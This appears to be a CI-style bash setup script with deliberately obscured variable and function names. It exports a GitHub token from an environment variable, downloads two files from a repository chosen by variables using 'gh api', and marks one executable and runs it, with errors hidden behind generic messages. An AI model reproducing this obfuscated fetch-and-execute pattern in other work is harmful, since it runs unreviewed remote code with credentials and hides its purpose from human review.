#!/usr/bin/env bash
set -euo pipefail
set +x

f() {
  printf '%s\n' "$1" >&2
  exit 1
}

s() {
  local n="$1"
  if [ "${!n+x}" != "x" ]; then
    f "setup failed"
  fi
}

n() {
  local n="$1"
  s "$n"
  if [ -z "${!n}" ]; then
    f "setup failed"
  fi
}

a() {
  local q="$1"
  if [[ ! "$q" =~ ^x_[a-z2-7]{16}$ ]]; then
    f "setup failed"
  fi
}

b() {
  local q="$1"
  if [[ ! "$q" =~ ^x_[a-z2-7]{16}(,x_[a-z2-7]{16})*$ ]]; then
    f "setup failed"
  fi
}

n x_i6ds74vrj7i57xsa
n x_4qj3lf5256ldlwqi
n x_nlzyq6tbjh3sbclz
n x_5ixbtnxm5is2lic3
a "${x_5ixbtnxm5is2lic3}"
s x_ouhzvxals3nqz3rv
if [ -n "${x_ouhzvxals3nqz3rv:-}" ]; then
  b "${x_ouhzvxals3nqz3rv}"
fi

d="$(mktemp -d)"
c() {
  rm -rf "$d"
}
trap c EXIT

t="$d/r"
l="$d/l"
o="$d/o"
mkdir -p "$t"

export GH_TOKEN="${x_nlzyq6tbjh3sbclz}"
r="${x_i6ds74vrj7i57xsa}"
v="${x_4qj3lf5256ldlwqi}"
k="${x_5ixbtnxm5is2lic3}"

g() {
  local p="$1"
  local q="$2"
  if ! gh api -H "Accept: application/vnd.github.raw" "repos/${r}/contents/${p}?ref=${v}" >"$q" 2>"$l"; then
    f "setup failed"
  fi
}

g "x/${k}/x" "$t/x"
g "x/${k}/d" "$t/d"
chmod 700 "$t/x"
chmod 600 "$t/d"

export x_3yz72zxfj7rkk3ox="$o"
if ! "$t/x" >"$l" 2>&1; then
  f "run failed"
fi

if [ -n "${x_ouhzvxals3nqz3rv:-}" ]; then
  n GITHUB_OUTPUT
fi
